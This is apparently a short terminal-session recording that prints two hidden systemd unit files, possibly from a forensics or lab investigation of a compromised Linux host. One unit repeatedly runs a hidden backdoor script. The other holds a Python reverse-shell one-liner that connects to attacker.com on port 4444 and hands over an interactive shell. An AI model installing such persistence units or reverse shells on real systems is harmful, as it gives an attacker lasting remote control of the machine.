[16.356026, "o", "[Unit]$\r\nDescription=System Persistence Service$\r\nAfter=network.target$\r\n$\r\n[Service]$\r\nType=simple$\r\nExecStart=/bin/bash -c \"while true; do /tmp/.hidden_backdoor.sh; sleep 60; done\"$\r\nRestart=always$\r\n$\r\n[Install]$\r\nWantedBy=multi-user.target$\r\n$\r\n"]
[16.356312, "o", "== /usr/lib/systemd/system/.hidden_service.service\r\n"]
[16.357253, "o", "[Unit]$\r\nDescription=Hidden Service$\r\n[Service]$\r\nExecStart=/usr/bin/python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"$\r\n$\r\n"]
